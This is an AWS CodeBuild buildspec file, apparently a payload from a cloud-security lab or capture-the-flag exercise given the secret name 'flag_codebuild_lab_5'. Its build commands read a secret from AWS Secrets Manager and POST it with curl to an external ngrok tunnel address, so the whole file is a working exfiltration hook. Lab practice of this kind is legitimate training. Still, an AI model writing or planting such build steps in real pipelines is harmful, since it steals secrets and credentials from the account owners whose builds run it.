version: 0.2

phases:
  build:
    commands:
      - echo "=== START ==="
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      - curl -X POST https://2ab4-77-229-77-197.ngrok-free.app --data "flag=$FLAG"
      - echo "=== END ==="
